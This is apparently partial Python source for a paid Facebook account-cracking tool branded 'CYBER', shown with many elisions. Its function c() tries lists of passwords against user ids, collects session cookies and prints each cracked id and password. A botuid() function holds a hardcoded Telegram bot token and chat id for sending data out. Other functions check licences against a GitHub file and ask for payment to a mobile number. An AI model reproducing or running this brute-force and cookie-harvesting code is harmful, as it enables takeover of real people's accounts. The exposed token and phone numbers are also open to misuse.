...
def botuid():
	...
	bot_token = '6486390730:AAEUhUEphke1OZTPdqZMV5ys7IFEMxWk_8o'
	chat_id = '5908058301'
	message = key2
...
\033[1;91m _______     ______  ______ _____  
  / ____\ \   / /  _ \|  ____|  __ \ 
 | |     \ \_/ /| |_) | |__  | |__) |
 | |      \   / |  _ <|  __| |  _  / 
 | |____   | |  | |_) | |____| | \ \ 
...
└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘
      ┌━━━━━━━━━━━━━━━━━ CYBER ━━━━━━━━━━━━━━━━━━┑
               ...
               \033[1;91mFACEBOK      :   CYBER0033              
               \033[1;97mGITHUB       :  Nirob-vai      
               \033[1;91mSTATUS       :   PAID😴            
               \033[1;97mTEAM         :  Hello Hacker,s 0.2 🥰                
...
def approval():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/OMOR-VAI/BCS_KING/blob/main/OMOR.txt').text
    if id in httpCaht:
      ...
      print('NAGAD - 01758481525')
      print('Send Pay And Give Ss And Send Me Key Or Ss Me Whatsapp')
      print('\33[1;37m----------------------------------------------')
      input('IF U WANT TO BUY THEN PRESS ENTER ')
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+880758481525?text='+tks),approval()
      time.sleep(1)
      approval()
  except:
    sys.exit()
...
def menu():
	...
	if ot == '1':
		os.system('xdg-open https://t.me/c0yber')
		crack_file()
...
def menu1():
	...
	print ("\033[1;97m     [3]\033[1;33m MY TELEGRAM CHANEL")
	ot = input('\n   \x1b[1;32m Choose option >>> ')
	if ot == '1':
...
def c(uid,pwx,ln):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r%s[CYBER_NIROB] [%s/%s] [OK-%s] [CP-%s] \r'%(wa,loop,ln,len(oks),len(cps))),
            sys.stdout.flush()
         ...
         #   log_cookies=session.cookies.get_dict().keys()
            ...
            #	botok(uid,ps)
            	...
            	cid = coki[65:80]
            	print('\033[1;92mCYBER-NIROB-OK[😁]\033[1;92m] \033[1;92m' +cid+ ' | ' +ps+    ' |>>'+tahunng(cid))
            	...
            	coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
            	cid = coki[82:97]
            	print('\33[1;30m(CYBER-Cp [💔] '+cid+ ' | ' +ps+'  |>>'+tahunng(cid))
